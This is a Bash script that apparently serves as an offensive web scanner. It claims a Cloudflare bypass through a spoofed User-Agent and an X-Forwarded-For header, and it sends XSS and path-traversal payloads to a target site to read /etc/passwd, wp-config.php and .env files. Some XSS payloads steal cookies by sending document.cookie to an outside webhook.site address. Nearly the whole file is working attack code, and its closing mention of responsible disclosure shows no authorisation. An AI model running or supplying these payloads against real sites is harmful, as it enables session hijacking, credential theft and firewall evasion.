#!/bin/bash

# Advanced Payload Tester - Based on Successful Cloudflare Bypass
# ทดสอบ payload แบบขั้นสูงโดยใช้เทคนิคที่สำเร็จแล้ว

TARGET_URL="$1"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    echo "Example: $0 https://pakyok77.link"
    exit 1
fi

# ตรวจสอบ URL
if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    TARGET_URL="https://$TARGET_URL"
fi

# ใช้ User-Agent ที่สำเร็จแล้ว
SUCCESSFUL_UA="Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"

echo "[+] Advanced Payload Tester - Cloudflare Bypass"
echo "=================================================="
echo "Target: $TARGET_URL"
echo "Using successful bypass technique:"
echo "  - User-Agent: $SUCCESSFUL_UA"
echo "  - Header: X-Forwarded-For: 127.0.0.1"
echo "  - Endpoint: /index.php?page="
echo ""

# XSS Payloads ที่จะทดสอบ
XSS_PAYLOADS=(
    # Basic XSS
    "<script>alert('XSS')</script>"
    "<script>alert('XSS')</script>"
    
    # Cookie stealing variations
    "<script>fetch('https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885?cookie='+document.cookie)</script>"
    "<script>var a='https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885';document.location=a+'/?c='+encodeURIComponent(document.cookie);</script>"
    
    # Event handlers
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "<body onload=alert('XSS')>"
    "<input onfocus=alert('XSS') autofocus>"
    
    # Filter bypass attempts
    "<ScRiPt>alert('XSS')</ScRiPt>"
    "<script>alert(String.fromCharCode(88,83,83))</script>"
    "<script>eval('al'+'ert(\"XSS\")')</script>"
    
    # DOM-based XSS
    "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>"
    "<script>document.body.innerHTML='<img src=x onerror=alert(\"XSS\")>';</script>"
)

# Path Traversal Payloads
LFI_PAYLOADS=(
    # Basic path traversal
    "../../../etc/passwd"
    "../../../../etc/passwd"
    "../../../../../etc/passwd"
    
    # Encoded variations
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    
    # Alternative encodings
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "..%252F..%252F..%252Fetc%252Fpasswd"
    
    # Double encoding
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    
    # Null byte injection
    "../../../etc/passwd%00"
    "../../../etc/passwd%00.jpg"
    
    # Common files to try
    "../../../wp-config.php"
    "../../../config.php"
    "../../../.env"
    "../../../.htaccess"
    "../../../index.php"
)

# Additional endpoints to test
ENDPOINTS=(
    "/index.php?page="
    "/index.php?file="
    "/index.php?path="
    "/index.php?include="
    "/page.php?page="
    "/file.php?file="
)

SUCCESSFUL_TESTS=0
TOTAL_TESTS=0

echo "[+] Testing XSS Payloads..."
echo "---------------------------"

for ((i=0; i<${#XSS_PAYLOADS[@]}; i++)); do
    PAYLOAD="${XSS_PAYLOADS[$i]}"
    echo "[$((i+1))/${#XSS_PAYLOADS[@]}] Testing XSS: ${PAYLOAD:0:50}..."
    
    # URL encode the payload
    ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | sed 's/ /%20/g; s/</%3C/g; s/>/%3E/g; s/"/%22/g; s/'\''/%27/g; s/(/%28/g; s/)/%29/g')
    
    for ENDPOINT in "${ENDPOINTS[@]}"; do
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        TEST_URL="${TARGET_URL}${ENDPOINT}${ENCODED_PAYLOAD}"
        
        echo "  [-] Testing: ${ENDPOINT}"
        
        # Test with curl
        RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/response_$$ \
            -H "User-Agent: $SUCCESSFUL_UA" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            --connect-timeout 10 \
            --max-time 15 \
            "$TEST_URL")
        
        HTTP_CODE="${RESPONSE: -3}"
        RESPONSE_CONTENT=$(cat /tmp/response_$$)
        rm -f /tmp/response_$$
        
        # Check if blocked
        IS_BLOCKED=false
        if echo "$RESPONSE_CONTENT" | grep -qi "cloudflare\|403 forbidden\|attention required\|sorry, you have been blocked"; then
            IS_BLOCKED=true
        fi
        
        # Check for XSS indicators
        HAS_XSS_INDICATOR=false
        if echo "$RESPONSE_CONTENT" | grep -qi "alert\|script\|onerror\|onload"; then
            HAS_XSS_INDICATOR=true
        fi
        
        if [ "$HTTP_CODE" = "200" ] && [ "$IS_BLOCKED" = false ]; then
            echo "    [+] Success! Status: $HTTP_CODE, Length: ${#RESPONSE_CONTENT}"
            echo "        URL: $TEST_URL"
            if [ "$HAS_XSS_INDICATOR" = true ]; then
                echo "        [XSS INDICATOR FOUND]"
            fi
            echo "        Response Preview: ${RESPONSE_CONTENT:0:100}..."
            SUCCESSFUL_TESTS=$((SUCCESSFUL_TESTS + 1))
        else
            echo "    [-] Blocked or failed (Status: $HTTP_CODE)"
        fi
        
        sleep 1  # Delay
    done
    echo ""
done

echo "[+] Testing Path Traversal Payloads..."
echo "--------------------------------------"

for ((i=0; i<${#LFI_PAYLOADS[@]}; i++)); do
    PAYLOAD="${LFI_PAYLOADS[$i]}"
    echo "[$((i+1))/${#LFI_PAYLOADS[@]}] Testing LFI: ${PAYLOAD:0:50}..."
    
    for ENDPOINT in "${ENDPOINTS[@]}"; do
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        TEST_URL="${TARGET_URL}${ENDPOINT}${PAYLOAD}"
        
        echo "  [-] Testing: ${ENDPOINT}"
        
        # Test with curl
        RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/response_$$ \
            -H "User-Agent: $SUCCESSFUL_UA" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            --connect-timeout 10 \
            --max-time 15 \
            "$TEST_URL")
        
        HTTP_CODE="${RESPONSE: -3}"
        RESPONSE_CONTENT=$(cat /tmp/response_$$)
        rm -f /tmp/response_$$
        
        # Check if blocked
        IS_BLOCKED=false
        if echo "$RESPONSE_CONTENT" | grep -qi "cloudflare\|403 forbidden\|attention required\|sorry, you have been blocked"; then
            IS_BLOCKED=true
        fi
        
        # Check for LFI indicators
        HAS_LFI_INDICATOR=false
        if echo "$RESPONSE_CONTENT" | grep -qi "root:.*:0:0\|mysql\|database\|config\|password"; then
            HAS_LFI_INDICATOR=true
        fi
        
        if [ "$HTTP_CODE" = "200" ] && [ "$IS_BLOCKED" = false ]; then
            echo "    [+] Success! Status: $HTTP_CODE, Length: ${#RESPONSE_CONTENT}"
            echo "        URL: $TEST_URL"
            if [ "$HAS_LFI_INDICATOR" = true ]; then
                echo "        [LFI INDICATOR FOUND]"
            fi
            echo "        Response Preview: ${RESPONSE_CONTENT:0:100}..."
            SUCCESSFUL_TESTS=$((SUCCESSFUL_TESTS + 1))
        else
            echo "    [-] Blocked or failed (Status: $HTTP_CODE)"
        fi
        
        sleep 1  # Delay
    done
    echo ""
done

echo "=================================================="
echo "Test Summary:"
echo "Total Tests: $TOTAL_TESTS"
echo "Successful Tests: $SUCCESSFUL_TESTS"
echo ""

if [ $SUCCESSFUL_TESTS -gt 0 ]; then
    echo "[+] Found $SUCCESSFUL_TESTS successful tests!"
    echo "   Use these results for further analysis"
else
    echo "[-] No successful tests found"
    echo "   The bypass technique may have been patched or rate-limited"
fi

echo ""
echo "Next Steps:"
echo "1. Analyze successful responses for actual vulnerability confirmation"
echo "2. Test in a browser to verify XSS execution"
echo "3. Document findings for responsible disclosure"
echo "4. Consider testing with different bypass techniques"